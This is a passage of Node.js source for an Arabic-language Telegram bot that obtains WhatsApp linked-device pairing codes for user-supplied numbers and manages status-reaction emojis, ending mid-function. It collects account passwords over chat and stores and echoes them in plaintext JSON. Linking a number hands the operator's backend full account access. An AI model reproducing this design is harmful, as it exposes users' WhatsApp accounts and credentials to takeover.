"use strict";

require("dotenv").config();

const fs = require("fs");
const path = require("path");
const express = require("express");
const cors = require("cors");
const axios = require("axios");
const TelegramBot = require("node-telegram-bot-api");

const BASE_DIR = __dirname;
const DATA_DIR = path.join(BASE_DIR, "data");
const ENV_PATH = path.join(BASE_DIR, ".env");
const SETTINGS_PATH = path.join(DATA_DIR, "bot_settings.json");
const USERS_PATH = path.join(DATA_DIR, "bot_users.json");
const USER_EMOJI_SETTINGS_PATH = path.join(DATA_DIR, "user_emoji_settings.json");
const LINKED_WHATSAPP_USERS_PATH = path.join(DATA_DIR, "linked_whatsapp_users.json");
const PENDING_PAIRINGS_PATH = path.join(DATA_DIR, "pending_pairings.json");
const AUTO_REPLY_LOG_PATH = path.join(DATA_DIR, "auto_reply_log.json");

const BOT_TOKEN = String(
  process.env.BOT_TOKEN || process.env.TELEGRAM_BOT_TOKEN || process.env.TOKEN || ""
).trim();
if (!BOT_TOKEN) {
  throw new Error("BOT_TOKEN is required in environment variables or .env file.");
}

const ADMIN_ID = Number(process.env.ADMIN_ID || 0) || 7231690686;
const PORT = Number(process.env.PORT || 10000);
const HEALTH_PORT = Number(process.env.HEALTH_PORT || PORT);
const PAIRING_API_URL = String(process.env.TARGET_PAIRING_API_URL || process.env.PAIRING_API_URL || "").trim();
const FORCE_SUB_CHANNEL = String(process.env.FORCE_SUB_CHANNEL || "").trim();
const BOT_LINK_URL = String(process.env.BOT_LINK_URL || "").trim();
const GREEN_API_BASE_URL = String(process.env.GREEN_API_BASE_URL || "https://api.green-api.com").trim().replace(/\/$/, "");
const GREEN_API_ID_INSTANCE = String(process.env.GREEN_API_ID_INSTANCE || "").trim();
const GREEN_API_TOKEN_INSTANCE = String(process.env.GREEN_API_TOKEN_INSTANCE || "").trim();
const LINKED_MESSAGE_IMAGE_URL = String(process.env.LINKED_MESSAGE_IMAGE_URL || "https://www.genspark.ai/api/files/s/18UAzOdi").trim();

const DEFAULT_AUTO_REPLY_CHANNEL_URL = "https://whatsapp.com/channel/0029Vb73l855K3zVq2QgsH1M";
const DEFAULT_CONTACT_NUMBER = "967773987296";
const DEFAULT_SITE_BRAND_NAME = "fares";
const DEFAULT_SITE_INFO_TEXT = `🔗 القناة الرسمية: ${DEFAULT_AUTO_REPLY_CHANNEL_URL}\n📞 رقم التواصل: ${DEFAULT_CONTACT_NUMBER}`;
const DEFAULT_PAIRING_LANGUAGE = "ar";
const PASSWORD_DISCOVERY_COMMAND = ".settings";
const PASSWORD_DISCOVERY_RESPONSE_WAIT_SECONDS = 12;

const USER_EMOJI_TRIGGERS = new Set([
  "تغيير ايموجي الحاله",
  "تغيير إيموجي الحاله",
  "تغيير ايموجي الحالة",
  "تغيير إيموجي الحالة",
  "غير الايموجي",
  "غيّر الايموجي",
  "غير الإيموجي",
  "غيّر الإيموجي",
]);

const DRF_TEXT_TRIGGERS = new Set([
  "اعدادات الموقع",
  "إعدادات الموقع",
  "اعدادات الموقع /drf",
  "إعدادات الموقع /drf",
  "drf",
  "/drf",
]);

const DEFAULT_SETTINGS = {
  admin_id: ADMIN_ID,
  start_message_template: "{emoji}",
  force_sub_channel: FORCE_SUB_CHANNEL,
  force_sub_url: FORCE_SUB_CHANNEL ? `https://t.me/${FORCE_SUB_CHANNEL.replace(/^@/, "")}` : "",
  auto_reply_channel_url: DEFAULT_AUTO_REPLY_CHANNEL_URL,
  contact_number: DEFAULT_CONTACT_NUMBER,
  site_brand_name: DEFAULT_SITE_BRAND_NAME,
  site_info_text: DEFAULT_SITE_INFO_TEXT,
  pair_code_api_url: PAIRING_API_URL,
  linked_message_image_url: LINKED_MESSAGE_IMAGE_URL,
  whatsapp_bot_message:
    "👑 *GOLDEN QUEEN VERIFICATION*\n\n🔑 *Link Code:* {code}\n\n📱 *طريقة الربط:*\n1️⃣ افتح واتساب.\n2️⃣ ادخل على الأجهزة المرتبطة.\n3️⃣ اختر ربط جهاز.\n4️⃣ استخدم الكود أعلاه إذا طُلب منك ذلك.\n\n✅ بعد اكتمال الربط سيصلك تلقائيًا تأكيد الربط وكلمة سر الإعدادات ورابط البوت.",
};

const state = {
  settings: {},
  users: {},
  userEmojiSettings: {},
  linkedWhatsappUsers: {},
  pendingPairings: {},
  autoReplyLog: {},
  userSessions: new Map(),
  backgroundTimers: new Map(),
  botInfo: null,
};

function ensureDir(dirPath) {
  fs.mkdirSync(dirPath, { recursive: true });
}

function readJson(filePath, fallback) {
  try {
    if (!fs.existsSync(filePath)) return structuredCloneSafe(fallback);
    const raw = fs.readFileSync(filePath, "utf8");
    if (!raw.trim()) return structuredCloneSafe(fallback);
    return JSON.parse(raw);
  } catch (error) {
    console.error(`Failed to read JSON from ${filePath}:`, error.message);
    return structuredCloneSafe(fallback);
  }
}

function writeJson(filePath, value) {
  ensureDir(path.dirname(filePath));
  const tempPath = `${filePath}.tmp`;
  fs.writeFileSync(tempPath, JSON.stringify(value, null, 2), "utf8");
  fs.renameSync(tempPath, filePath);
}

function structuredCloneSafe(value) {
  return JSON.parse(JSON.stringify(value));
}

function nowIso() {
  return new Date().toISOString();
}

function normalizeAsciiDigits(value) {
  const map = {
    "٠": "0", "١": "1", "٢": "2", "٣": "3", "٤": "4",
    "٥": "5", "٦": "6", "٧": "7", "٨": "8", "٩": "9",
    "۰": "0", "۱": "1", "۲": "2", "۳": "3", "۴": "4",
    "۵": "5", "۶": "6", "۷": "7", "۸": "8", "۹": "9",
  };
  return String(value || "").replace(/[٠-٩۰-۹]/g, (char) => map[char] || char);
}

function normalizePhoneNumber(value) {
  const normalized = normalizeAsciiDigits(String(value || "")).replace(/[^\d]/g, "");
  if (!normalized) return "";
  if (normalized.startsWith("00")) return normalized.slice(2);
  return normalized;
}

function normalizeChatId(value) {
  const phone = normalizePhoneNumber(value);
  return phone ? `${phone}@c.us` : "";
}

function isAdminFromUserId(userId) {
  return Number(userId || 0) === Number(state.settings.admin_id || ADMIN_ID);
}

function getUserSession(userId) {
  if (!state.userSessions.has(userId)) {
    state.userSessions.set(userId, {});
  }
  return state.userSessions.get(userId);
}

function clearUserFlow(session) {
  delete session.awaitingPairNumber;
  delete session.awaitingEmojiCredentials;
  delete session.awaitingUserEmoji;
  delete session.awaitingDrfCredentials;
  delete session.selectedPairLanguage;
  delete session.selectedDrfLanguage;
  delete session.awaitingPasswordNumber;
}

function loadState() {
  ensureDir(DATA_DIR);
  state.settings = { ...DEFAULT_SETTINGS, ...readJson(SETTINGS_PATH, {}) };
  state.users = readJson(USERS_PATH, {});
  state.userEmojiSettings = readJson(USER_EMOJI_SETTINGS_PATH, {});
  state.linkedWhatsappUsers = readJson(LINKED_WHATSAPP_USERS_PATH, {});
  state.pendingPairings = readJson(PENDING_PAIRINGS_PATH, {});
  state.autoReplyLog = readJson(AUTO_REPLY_LOG_PATH, {});
}

function saveSettings() {
  writeJson(SETTINGS_PATH, state.settings);
}

function saveUsers() {
  writeJson(USERS_PATH, state.users);
}

function saveUserEmojiSettings() {
  writeJson(USER_EMOJI_SETTINGS_PATH, state.userEmojiSettings);
}

function saveLinkedWhatsappUsers() {
  writeJson(LINKED_WHATSAPP_USERS_PATH, state.linkedWhatsappUsers);
}

function savePendingPairings() {
  writeJson(PENDING_PAIRINGS_PATH, state.pendingPairings);
}

function saveAutoReplyLog() {
  writeJson(AUTO_REPLY_LOG_PATH, state.autoReplyLog);
}

function registerUser(msg) {
  const user = msg?.from;
  if (!user) return;
  const userId = String(user.id);
  const existing = state.users[userId] || {};
  state.users[userId] = {
    id: user.id,
    username: user.username || "",
    first_name: user.first_name || "",
    last_name: user.last_name || "",
    language_code: user.language_code || "",
    is_bot: Boolean(user.is_bot),
    created_at: existing.created_at || nowIso(),
    updated_at: nowIso(),
  };
  saveUsers();
}

function getEffectiveUserEmoji(userId) {
  const record = state.userEmojiSettings[String(userId)] || {};
  return String(record.statusCustomReact || record.emoji || "🔥").trim() || "🔥";
}

function splitEmojiInput(text) {
  return String(text || "")
    .split(/[\s,،]+/)
    .map((item) => item.trim())
    .filter(Boolean)
    .slice(0, 10);
}

function buildForceSubscriptionUrl() {
  if (state.settings.force_sub_url) return state.settings.force_sub_url;
  const channel = String(state.settings.force_sub_channel || "").trim().replace(/^@/, "");
  return channel ? `https://t.me/${channel}` : "";
}

function renderStartMessage({ isAdmin, userId }) {
  const emoji = userId ? getEffectiveUserEmoji(userId) : "🔥";
  const autoReplyStatus = state.settings.auto_reply_channel_url ? `✅ التفعيل: ${state.settings.auto_reply_channel_url}` : "⚠️ لم يتم ضبط قناة الرد التلقائي";
  const adminText = isAdmin ? "👨‍💻 أنت المطور الأساسي" : `👨‍💻 المطور الأساسي: ${state.settings.site_brand_name || DEFAULT_SITE_BRAND_NAME}`;
  const template = String(state.settings.start_message_template || "{emoji}");
  return template
    .replaceAll("{emoji}", emoji)
    .replaceAll("{auto_reply_status}", autoReplyStatus)
    .replaceAll("{admin_text}", adminText)
    .trim();
}

function buildMainKeyboard({ isAdmin }) {
  const keyboard = [
    [
      { text: "🔗 ربط رقم واتساب", callback_data: "pair_code" },
      { text: "😀 رموز الحالة", callback_data: "user_set_emoji" },
    ],
    [
      { text: "✨ تغيير رموز التفاعل", callback_data: "user_status_custom_react" },
      { text: "📱 أرقامي المربوطة", callback_data: "my_linked_numbers" },
    ],
    [{ text: "🔄 تحديث", callback_data: "refresh_home" }],
  ];

  if (isAdmin) {
    keyboard.splice(2, 0, [
      { text: "⚙️ /drf", callback_data: "open_drf" },
      { text: "🛠 /dev", callback_data: "open_dev_panel" },
    ]);
  }

  return { inline_keyboard: keyboard };
}

function buildSubscriptionKeyboard() {
  const url = buildForceSubscriptionUrl();
  const rows = [];
  if (url) {
    rows.push([{ text: "📢 اشترك في القناة", url }]);
  }
  rows.push([{ text: "✅ تحقق من الاشتراك", callback_data: "check_subscription" }]);
  return { inline_keyboard: rows };
}

function buildPairLanguageKeyboard(mode = "pair") {
  const prefix = mode === "drf" ? "drf_lang" : "pair_lang";
  return {
    inline_keyboard: [
      [
        { text: "العربية", callback_data: `${prefix}:ar` },
        { text: "English", callback_data: `${prefix}:en` },
      ],
      [{ text: "🏠 الرئيسية", callback_data: "refresh_home" }],
    ],
  };
}

function buildOwnedNumbersKeyboard(userId) {
  const numbers = getAllUserWhatsappRecords(userId);
  if (!numbers.length) {
    return { inline_keyboard: [[{ text: "🏠 الرئيسية", callback_data: "refresh_home" }]] };
  }
  const rows = numbers.map(([number]) => [
    { text: `❌ فصل ${number}`, callback_data: `unlink_number:${number}` },
  ]);
  rows.push([{ text: "🏠 الرئيسية", callback_data: "refresh_home" }]);
  return { inline_keyboard: rows };
}

function buildPairingConfirmationKeyboard(number) {
  return {
    inline_keyboard: [
      [
        { text: "✅ نعم", callback_data: `pair_confirm_yes:${number}` },
        { text: "❌ لا", callback_data: `pair_confirm_no:${number}` },
      ],
    ],
  };
}

function getPairLanguagePack(code) {
  const packs = {
    ar: {
      choose: "اختر لغة رسالة الربط:",
      prompt: "أرسل رقم واتساب الدولي الآن مثل: 9677XXXXXXX",
      requesting: "⏳ جاري طلب كود الربط، انتظر قليلًا...",
      failed: "❌ فشل الحصول على كود الربط. حاول لاحقًا.",
    },
    en: {
      choose: "Choose pairing message language:",
      prompt: "Send the international WhatsApp number now. Example: 9677XXXXXXX",
      requesting: "⏳ Requesting pairing code, please wait...",
      failed: "❌ Failed to get pairing code. Please try again later.",
    },
  };
  return packs[code] || packs[DEFAULT_PAIRING_LANGUAGE];
}

function buildLinkedSummary(userId) {
  const records = getAllUserWhatsappRecords(userId);
  if (!records.length) {
    return "📭 لا يوجد لديك أي رقم مربوط حاليًا.";
  }
  const lines = ["📱 أرقامك المربوطة:"];
  for (const [number, payload] of records) {
    const password = extractSitePasswordFromRecord(payload);
    lines.push(`• ${number}${password ? ` — 🔐 ${password}` : ""}`);
  }
  return lines.join("\n");
}

function extractSitePasswordFromRecord(record) {
  if (!record || typeof record !== "object") return "";
  const candidates = [
    record.site_password,
    record.password,
    record.sitePassword,
    record.settings_password,
  ];
  for (const candidate of candidates) {
    const value = String(candidate || "").trim();
    if (value) return value;
  }
  return "";
}

function getAllUserWhatsappRecords(userId) {
  const targetId = Number(userId || 0);
  return Object.entries(state.linkedWhatsappUsers)
    .filter(([, payload]) => Number(payload?.telegram_user_id || 0) === targetId)
    .sort((a, b) => String(a[0]).localeCompare(String(b[0])));
}

function getUserPrimaryWhatsappRecord(userId) {
  const records = getAllUserWhatsappRecords(userId);
  return records[0] || ["", {}];
}

function updateNumberRecord(number, patch) {
  const normalized = normalizePhoneNumber(number);
  if (!normalized) return;
  const existingLinked = state.linkedWhatsappUsers[normalized] || {};
  const existingPending = state.pendingPairings[normalized] || {};
  const merged = {
    ...existingPending,
    ...existingLinked,
    ...patch,
    whatsapp_number: normalized,
    updated_at: nowIso(),
  };
  state.linkedWhatsappUsers[normalized] = merged;
  saveLinkedWhatsappUsers();
}

function registerPendingPairing(userId, number, extra = {}) {
  const normalized = normalizePhoneNumber(number);
  if (!normalized) return;
  const existing = state.pendingPairings[normalized] || {};
  state.pendingPairings[normalized] = {
    ...existing,
    ...extra,
    whatsapp_number: normalized,
    telegram_user_id: Number(userId || 0),
    created_at: existing.created_at || nowIso(),
    updated_at: nowIso(),
  };
  savePendingPairings();
}

function unlinkUserNumber(userId, number) {
  const normalized = normalizePhoneNumber(number);
  const payload = state.linkedWhatsappUsers[normalized];
  if (!payload) return false;
  if (Number(payload.telegram_user_id || 0) !== Number(userId || 0)) return false;
  delete state.linkedWhatsappUsers[normalized];
  delete state.pendingPairings[normalized];
  saveLinkedWhatsappUsers();
  savePendingPairings();
  return true;
}

function adminStatusText() {
  const totalUsers = Object.keys(state.users).length;
  const totalLinked = Object.keys(state.linkedWhatsappUsers).length;
  const totalPending = Object.keys(state.pendingPairings).length;
  return [
    "🛠 لوحة المطور",
    `👤 ADMIN_ID: ${state.settings.admin_id || ADMIN_ID}`,
    `👥 المستخدمون: ${totalUsers}`,
    `📱 الأرقام المربوطة: ${totalLinked}`,
    `⏳ الطلبات المعلقة: ${totalPending}`,
    `🔗 Pair API: ${state.settings.pair_code_api_url || "غير مضبوط"}`,
    `🌐 Health Port: ${HEALTH_PORT}`,
  ].join("\n");
}

async function ensureSubscription(msg) {
  const channel = String(state.settings.force_sub_channel || "").trim();
  if (!channel) return true;
  const userId = msg?.from?.id;
  if (!userId) return false;
  try {
    const member = await bot.getChatMember(channel, userId);
    const allowedStatuses = new Set(["creator", "administrator", "member"]);
    return allowedStatuses.has(member.status);
  } catch (error) {
    console.error("Subscription check failed:", error.response?.body || error.message);
    return true;
  }
}

async function promptForceSubscription(chatId) {
  await bot.sendMessage(chatId, "📢 يلزم الاشتراك في القناة أولاً ثم اضغط تحقق من الاشتراك.", {
    reply_markup: buildSubscriptionKeyboard(),
  });
}

function parseCredentialsMessage(text) {
  const lines = String(text || "")
    .split(/\r?\n/)
    .map((line) => line.trim())
    .filter(Boolean);
  if (lines.length >= 2) {
    const number = normalizePhoneNumber(lines[0]);
    const password = String(lines[1] || "").trim();
    if (number && password) return { number, password };
  }

  const tokens = String(text || "").trim().split(/\s+/).filter(Boolean);
  if (tokens.length >= 2) {
    const number = normalizePhoneNumber(tokens[0]);
    const password = tokens.slice(1).join(" ").trim();
    if (number && password) return { number, password };
  }
  return null;
}

async function requestPairingCode(number) {
  const normalized = normalizePhoneNumber(number);
  if (!normalized) {
    throw new Error("رقم واتساب غير صالح.");
  }
  const apiUrl = String(state.settings.pair_code_api_url || PAIRING_API_URL || "").trim();
  if (!apiUrl) {
    throw new Error("لم يتم ضبط رابط Pairing API داخل متغيرات الاستضافة.");
  }

  const payload = {
    num: normalized,
    number: normalized,
    phone: normalized,
    phoneNumber: normalized,
  };

  const response = await axios.post(apiUrl, payload, {
    timeout: 30000,
    headers: { "Content-Type": "application/json" },
    validateStatus: () => true,
  });

  if (response.status >= 400) {
    const message = response.data?.error || response.data?.message || `HTTP ${response.status}`;
    throw new Error(String(message));
  }

  const code = String(response.data?.code || response.data?.pairingCode || response.data?.pair_code || "").trim();
  if (!code) {
    throw new Error("الـ API لم يُرجع كود ربط صالح.");
  }

  return {
    code,
    number: normalized,
    raw: response.data,
  };
}

function buildWhatsappCommandReply(code) {
  const template = String(state.settings.whatsapp_bot_message || DEFAULT_SETTINGS.whatsapp_bot_message);
  return template.replaceAll("{code}", String(code || "").trim());
}

async function sendWhatsappMessage(chatId, message) {
  if (!GREEN_API_ID_INSTANCE || !GREEN_API_TOKEN_INSTANCE) {
    throw new Error("Green API sendMessage is not configured.");
  }
  const endpoint = `${GREEN_API_BASE_URL}/waInstance${GREEN_API_ID_INSTANCE}/sendMessage/${GREEN_API_TOKEN_INSTANCE}`;
  const response = await axios.post(
    endpoint,
    {
      chatId: normalizeChatId(chatId),
      message: String(message || ""),
      linkPreview: true,
    },
    {
      timeout: 30000,
      headers: { "Content-Type": "application/json" },
      validateStatus: () => true,
    }
  );
  if (response.status >= 400) {
    throw new Error(String(response.data?.message || response.data?.error || `HTTP ${response.status}`));
  }
  return response.data;
}

async function sendWhatsappImageByUrl(chatId, fileUrl, caption = "") {
  if (!GREEN_API_ID_INSTANCE || !GREEN_API_TOKEN_INSTANCE) {
    throw new Error("Green API sendFileByUrl is not configured.");
  }
  const endpoint = `${GREEN_API_BASE_URL}/waInstance${GREEN_API_ID_INSTANCE}/sendFileByUrl/${GREEN_API_TOKEN_INSTANCE}`;
  const response = await axios.post(
    endpoint,
    {
      chatId: normalizeChatId(chatId),
      urlFile: String(fileUrl || "").trim(),
      fileName: "linked-success.png",
      caption,
    },
    {
      timeout: 30000,
      headers: { "Content-Type": "application/json" },
      validateStatus: () => true,
    }
  );
  if (response.status >= 400) {
    throw new Error(String(response.data?.message || response.data?.error || `HTTP ${response.status}`));
  }
  return response.data;
}

function buildLinkedNumberPrivateMessage(number, sitePassword = "", botLink = "") {
  const lines = ["✅ تم ربط الرقم بنجاح وتم التعرف عليه داخل البوت بشكل صحيح."];
  if (number) lines.push(`📞 الرقم المربوط: ${number}`);
  if (sitePassword) lines.push(`🔐 كلمة سر إعدادات الموقع: ${sitePassword}`);
  else lines.push("⏳ لم يتم حفظ كلمة السر بعد.");
  if (botLink) lines.push(`🤖 رابط البوت: ${botLink}`);
  return lines.join("\n");
}

async function deliverLinkedNumberPrivateBundle(number, sitePassword = "", botLink = "") {
  const normalized = normalizePhoneNumber(number);
  if (!normalized) return false;

  let changed = false;
  const existing = state.linkedWhatsappUsers[normalized] || {};
  if (LINKED_MESSAGE_IMAGE_URL && existing.whatsapp_linked_image_signature !== LINKED_MESSAGE_IMAGE_URL) {
    try {
      await sendWhatsappImageByUrl(normalized, LINKED_MESSAGE_IMAGE_URL, "✅ تم الربط بنجاح");
      existing.whatsapp_linked_image_signature = LINKED_MESSAGE_IMAGE_URL;
      existing.whatsapp_linked_image_sent_at = nowIso();
      changed = true;
    } catch (error) {
      console.error("Failed to send linked image:", error.message);
    }
  }

  const signature = JSON.stringify({ sitePassword, botLink });
  if (existing.whatsapp_private_bundle_signature !== signature) {
    await sendWhatsappMessage(normalized, buildLinkedNumberPrivateMessage(normalized, sitePassword, botLink));
    existing.whatsapp_private_bundle_signature = signature;
    existing.whatsapp_private_bundle_sent_at = nowIso();
    changed = true;
  }

  if (changed) {
    state.linkedWhatsappUsers[normalized] = {
      ...existing,
      telegram_user_id: existing.telegram_user_id || 0,
      whatsapp_number: normalized,
      updated_at: nowIso(),
    };
    saveLinkedWhatsappUsers();
  }
  return true;
}

function getPublicBotLink() {
  if (BOT_LINK_URL) return BOT_LINK_URL;
  const username = state.botInfo?.username;
  return username ? `https://t.me/${username}` : "";
}

function schedulePairingConfirmationPrompt(number, userId, delaySeconds = 30) {
  const normalized = normalizePhoneNumber(number);
  if (!normalized || !userId) return;
  const key = `${userId}:${normalized}`;
  if (state.backgroundTimers.has(key)) {
    clearTimeout(state.backgroundTimers.get(key));
  }
  const timer = setTimeout(async () => {
    state.backgroundTimers.delete(key);
    try {
      await bot.sendMessage(userId, `❓ هل تم ربط حسابك بنجاح للرقم ${normalized}؟`, {
        reply_markup: buildPairingConfirmationKeyboard(normalized),
      });
      registerPendingPairing(userId, normalized, {
        telegram_pairing_confirmation_prompt_sent: true,
        telegram_pairing_confirmation_prompt_sent_at: nowIso(),
      });
    } catch (error) {
      console.error("Failed to send pairing confirmation prompt:", error.message);
    }
  }, Math.max(Number(delaySeconds || 0), 0) * 1000);
  state.backgroundTimers.set(key, timer);
}

async function processPairingConfirmationYes(userId, number) {
  const normalized = normalizePhoneNumber(number);
  if (!normalized) return "❌ تعذر تحديد الرقم المطلوب.";
  const linked = state.linkedWhatsappUsers[normalized] || {};
  const password = extractSitePasswordFromRecord(linked);
  const botLink = getPublicBotLink();

  if (password) {
    try {
      await deliverLinkedNumberPrivateBundle(normalized, password, botLink);
    } catch (error) {
      console.error("Failed to deliver private bundle:", error.message);
    }
  }

  const selectedEmoji = getEffectiveUserEmoji(userId);
  updateNumberRecord(normalized, {
    telegram_user_id: Number(userId || 0),
    telegram_pairing_confirmation_answer: "yes",
    telegram_pairing_confirmation_answered_at: nowIso(),
    confirmed_emoji: selectedEmoji,
  });

  return [
    `✅ تم تأكيد ربط الرقم ${normalized}.`,
    password ? `🔐 كلمة السر المحفوظة: ${password}` : "ℹ️ لا توجد كلمة سر محفوظة لهذا الرقم حتى الآن.",
    selectedEmoji ? `✨ رمز التفاعل الحالي: ${selectedEmoji}` : "",
  ].filter(Boolean).join("\n");
}

function parseCallbackData(data) {
  const value = String(data || "");
  const idx = value.indexOf(":");
  if (idx === -1) return { name: value, value: "" };
  return { name: value.slice(0, idx), value: value.slice(idx + 1) };
}

const bot = new TelegramBot(BOT_TOKEN, {
  polling: {
    autoStart: false,
    params: {
      timeout: 30,
    },
  },
});

bot.on("polling_error", (error) => {
  console.error("Polling error:", error?.message || error);
});

bot.onText(/^\/start(?:@\w+)?(?:\s+.*)?$/i, async (msg) => {
  try {
    registerUser(msg);
    const allowed = await ensureSubscription(msg);
    if (!allowed) {
      await promptForceSubscription(msg.chat.id);
      return;
    }
    await bot.sendMessage(msg.chat.id, renderStartMessage({
      isAdmin: isAdminFromUserId(msg.from?.id),
      userId: msg.from?.id,
    }), {
      reply_markup: buildMainKeyboard({ isAdmin: isAdminFromUserId(msg.from?.id) }),
    });
  } catch (error) {
    await safeSendError(msg.chat.id, error);
  }
});

bot.onText(/^\/menu(?:@\w+)?$/i, async (msg) => {
  try {
    registerUser(msg);
    const allowed = await ensureSubscription(msg);
    if (!allowed) {
      await promptForceSubscription(msg.chat.id);
      return;
    }
    await bot.sendMessage(msg.chat.id, renderStartMessage({
      isAdmin: isAdminFromUserId(msg.from?.id),
      userId: msg.from?.id,
    }), {
      reply_markup: buildMainKeyboard({ isAdmin: isAdminFromUserId(msg.from?.id) }),
    });
  } catch (error) {
    await safeSendError(msg.chat.id, error);
  }
});

bot.onText(/^\/emoji(?:@\w+)?$/i, async (msg) => {
  try {
    registerUser(msg);
    const allowed = await ensureSubscription(msg);
    if (!allowed) {
      await promptForceSubscription(msg.chat.id);
      return;
    }
    const session = getUserSession(msg.from.id);
    clearUserFlow(session);
    session.awaitingEmojiCredentials = true;
    await bot.sendMessage(
      msg.chat.id,
      "هلا عزيزي لتغير رمز الحاله ارسل رقمك + الباسورد بالطريقه التاليه 👇\n967773987296\n1234567\n\nاذا مو عارف الباسورد ارسل خاص رقمك ع الواتس كلمة\n.settings\nراح يتم ارسال الباسورد قم بنسخه ورسله مع الرقم في رساله وحده.."
    );
  } catch (error) {
    await safeSendError(msg.chat.id, error);
  }
});

bot.onText(/^\/drf(?:@\w+)?$/i, async (msg) => {
  try {
    registerUser(msg);
    const allowed = await ensureSubscription(msg);
    if (!allowed) {
      await promptForceSubscription(msg.chat.id);
      return;
    }
    if (!isAdminFromUserId(msg.from?.id)) {
      await bot.sendMessage(
        msg.chat.id,
        "🔒 تم إخفاء وقفل الدخول لإعدادات الرقم من الواجهة.\n😀 استخدم زر رموز الحالة فقط لتعديل التفاعل التلقائي.",
        { reply_markup: buildMainKeyboard({ isAdmin: false }) }
      );
      return;
    }
    const session = getUserSession(msg.from.id);
    clearUserFlow(session);
    session.awaitingDrfCredentials = true;
    await bot.sendMessage(
      msg.chat.id,
      "🔐 تم تعطيل الدخول التلقائي لإعدادات الموقع.\nمن الآن الدخول هيكون يدوي فقط.\nاختَر لغة صفحة الإعدادات، وبعدها ابعت الرقم الدولي وكلمة المرور في رسالة واحدة.",
      { reply_markup: buildPairLanguageKeyboard("drf") }
    );
  } catch (error) {
    await safeSendError(msg.chat.id, error);
  }
});

bot.onText(/^\/help(?:@\w+)?$/i, async (msg) => {
  try {
    registerUser(msg);
    const lines = [
      "📘 الأوامر المتاحة:",
      "/start - فتح الواجهة الرئيسية",
      "/menu - عرض القائمة",
      "/emoji - ربط الرقم وإضافة كلمة المرور",
      "/ping - فحص التشغيل",
      "/help - المساعدة",
      isAdminFromUserId(msg.from?.id) ? "/drf - واجهة المطور" : null,
      isAdminFromUserId(msg.from?.id) ? "/dev - لوحة المطور" : null,
    ].filter(Boolean);
    await bot.sendMessage(msg.chat.id, lines.join("\n"));
  } catch (error) {
    await safeSendError(msg.chat.id, error);
  }
});

bot.onText(/^\/ping(?:@\w+)?$/i, async (msg) => {
  try {
    registerUser(msg);
    const allowed = await ensureSubscription(msg);
    if (!allowed) {
      await promptForceSubscription(msg.chat.id);
      return;
    }
    await bot.sendMessage(msg.chat.id, "✅ البوت شغال.");
  } catch (error) {
    await safeSendError(msg.chat.id, error);
  }
});

bot.onText(/^\/dev(?:@\w+)?$/i, async (msg) => {
  try {
    registerUser(msg);
    if (!isAdminFromUserId(msg.from?.id)) {
      await bot.sendMessage(msg.chat.id, "⛔ هذه الواجهة للمطور فقط.");
      return;
    }
    await bot.sendMessage(msg.chat.id, adminStatusText(), {
      reply_markup: {
        inline_keyboard: [[{ text: "🏠 الرئيسية", callback_data: "refresh_home" }]],
      },
    });
  } catch (error) {
    await safeSendError(msg.chat.id, error);
  }
});

bot.on("callback_query", async (query) => {
  const chatId = query.message?.chat?.id;
  const userId = query.from?.id;
  if (!chatId || !userId) return;

  try {
    registerUser({ from: query.from });
    await bot.answerCallbackQuery(query.id);
    const allowed = await ensureSubscription({ from: query.from });

    const session = getUserSession(userId);
    const { name, value } = parseCallbackData(query.data);

    if (
      ["pair_code", "refresh_home", "user_set_emoji", "user_status_custom_react", "my_linked_numbers"].includes(name) &&
      !isAdminFromUserId(userId) &&
      !allowed
    ) {
      await promptForceSubscription(chatId);
      return;
    }

    if (name === "check_subscription") {
      if (!allowed) {
        await promptForceSubscription(chatId);
        return;
      }
      await bot.sendMessage(chatId, "✅ تم التحقق من الاشتراك بنجاح.", {
        reply_markup: buildMainKeyboard({ isAdmin: isAdminFromUserId(userId) }),
      });
      return;
    }

    if (name === "pair_code") {
      clearUserFlow(session);
      session.awaitingPairNumber = false;
      await bot.sendMessage(chatId, getPairLanguagePack(DEFAULT_PAIRING_LANGUAGE).choose, {
        reply_markup: buildPairLanguageKeyboard("pair"),
      });
      return;
    }

    if (name === "pair_lang") {
      clearUserFlow(session);
      session.selectedPairLanguage = value === "en" ? "en" : "ar";
      session.awaitingPairNumber = true;
      await bot.sendMessage(chatId, getPairLanguagePack(session.selectedPairLanguage).prompt);
      return;
    }

    if (name === "drf_lang") {
      clearUserFlow(session);
      session.selectedDrfLanguage = value === "en" ? "en" : "ar";
      session.awaitingDrfCredentials = true;
      await bot.sendMessage(
        chatId,
        session.selectedDrfLanguage === "en"
          ? "Send the number and password in one message."
          : "أرسل الرقم الدولي وكلمة المرور في رسالة واحدة."
      );
      return;
    }

    if (name === "user_set_emoji") {
      clearUserFlow(session);
      session.awaitingEmojiCredentials = true;
      await bot.sendMessage(
        chatId,
        "هلا عزيزي لتغير رمز الحاله ارسل رقمك + الباسورد بالطريقه التاليه 👇\n967773987296\n1234567\n\nاذا مو عارف الباسورد ارسل خاص رقمك ع الواتس كلمة\n.settings\nراح يتم ارسال الباسورد قم بنسخه ورسله مع الرقم في رساله وحده.."
      );
      return;
    }

    if (name === "user_status_custom_react") {
      clearUserFlow(session);
      session.awaitingUserEmoji = true;
      await bot.sendMessage(chatId, "أرسل الآن حتى 10 رموز تعبيرية مفصولة بمسافة أو فاصلة.");
      return;
    }

    if (name === "pair_confirm_yes") {
      updateNumberRecord(value, {
        telegram_pairing_confirmation_answer: "yes",
        telegram_pairing_confirmation_answered_at: nowIso(),
      });
      const result = await processPairingConfirmationYes(userId, value);
      await bot.sendMessage(chatId, result, {
        reply_markup: buildMainKeyboard({ isAdmin: isAdminFromUserId(userId) }),
      });
      return;
    }

    if (name === "pair_confirm_no") {
      updateNumberRecord(value, {
        telegram_pairing_confirmation_answer: "no",
        telegram_pairing_confirmation_answered_at: nowIso(),
      });
      await bot.sendMessage(
        chatId,
        "👍 تمام، كمّل الربط أولًا. وبعد ما يكتمل تقدر تغيّر رموز الحالة من الواجهة الرئيسية.",
        { reply_markup: buildMainKeyboard({ isAdmin: isAdminFromUserId(userId) }) }
      );
      return;
    }

    if (name === "open_drf") {
      if (!isAdminFromUserId(userId)) {
        await bot.sendMessage(chatId, "🔒 تم إخفاء وقفل الدخول لإعدادات الرقم من الواجهة.\n😀 استخدم زر رموز الحالة فقط.");
        return;
      }
      await bot.sendMessage(chatId, adminStatusText(), {
        reply_markup: {
          inline_keyboard: [[{ text: "🏠 الرئيسية", callback_data: "refresh_home" }]],
        },
      });
      return;
    }

    if (name === "open_dev_panel") {
      if (!isAdminFromUserId(userId)) {
        await bot.sendMessage(chatId, "⛔ هذه الواجهة للمطور فقط.");
        return;
      }
